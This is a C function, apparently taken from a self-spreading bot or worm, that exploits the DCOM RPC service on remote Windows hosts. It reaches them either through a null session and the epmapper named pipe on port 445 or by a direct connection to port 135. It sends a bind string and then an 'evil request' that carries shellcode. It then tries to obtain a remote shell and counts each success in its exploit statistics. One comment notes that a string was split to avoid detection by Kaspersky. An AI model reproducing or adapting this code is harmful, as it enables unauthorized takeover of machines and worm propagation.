BOOL dcom(EXINFO exinfo)
{
	if (exinfo.port == 445) {
		NETRESOURCEW nr;

		if (!ConnectViaNullSession(exinfo.ip, &nr)) 
			return FALSE;
		else {
			char szPipePath[MAX_PATH];
			//sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", exinfo.ip);//sorry kaspersky
			sprintf(szPipePath, "\\\\%s\\", exinfo.ip);
			strcat(szPipePath,"pipe\\epmapper");
			HANDLE hFile = CreateFile(szPipePath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			int TargetOS = FpHost(exinfo.ip, FP_PORT5K);
			//int TargetOS=FpHost(exinfo.ip,FP_NP);
			//if (TargetOS==OS_UNKNOWN) 
				//TargetOS=FpHost(exinfo.ip,FP_SMB);
			//if (TargetOS == OS_WINNT) 
				//return FALSE;

			// get shellcode
			DWORD reqbufsize;
			char *reqbuf = CreateDCOMRequestPacket(exinfo, &reqbufsize, TargetOS, TRUE);
			if (!reqbuf) {
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			unsigned long lWritten;
			char *szInBuf = (char *)malloc(100000);
			ZeroMemory(szInBuf,100000);

			// send the bind string
			DWORD dwRead;
			TransactNamedPipe(hFile, bindstr, sizeof(bindstr)-1, szInBuf, 10000, &dwRead, NULL);
			if (szInBuf[2] != 0x0C) {
				free(szInBuf); 
				free(reqbuf);
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			// send the evil request
			if (!WriteFile(hFile, reqbuf, reqbufsize, &lWritten, 0)) {
				free(szInBuf); 
				free(reqbuf);
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			free(reqbuf); 
			free(szInBuf);
			CloseHandle(hFile);
			CloseNullSession(exinfo.ip);
		}

	} else { // port 135 and others

		int TargetOS=FpHost(exinfo.ip,FP_RPC);
		//if (TargetOS==OS_UNKNOWN)
			//TargetOS=FpHost(exinfo.ip,FP_SMB);
		//if (TargetOS == OS_WINNT) 
			//return FALSE;
		
		// get a funky fresh socket
		SOCKET sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (sSocket == SOCKET_ERROR) 
			return FALSE;

		// fill in sockaddr and resolve the host
		SOCKADDR_IN ssin; 
		ZeroMemory(&ssin,sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(exinfo.port);
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

		// get shellcode
		DWORD reqbufsize;
		char *reqbuf = CreateDCOMRequestPacket(exinfo, &reqbufsize, TargetOS, FALSE);
		if (!reqbuf) {
			fclosesocket(sSocket);
			return FALSE;
		}

		// connect to the server
		int iErr = fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
		if (iErr == -1) { // connect failed, exit
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// send the bind string
		if (fsend(sSocket, bindstr, sizeof(bindstr)-1, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// read reply
		char recvbuf[4096];
		frecv(sSocket, recvbuf, 4096, 0);
		// Send the evil request
		if (fsend(sSocket, reqbuf, reqbufsize, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		free(reqbuf);
		// Close the socket
		fclosesocket(sSocket);		
	}

	Sleep(2000);
	
	if (DShell(exinfo))
	{
		exploit[ exinfo.exploit ].stats++;
	}

	return TRUE;
}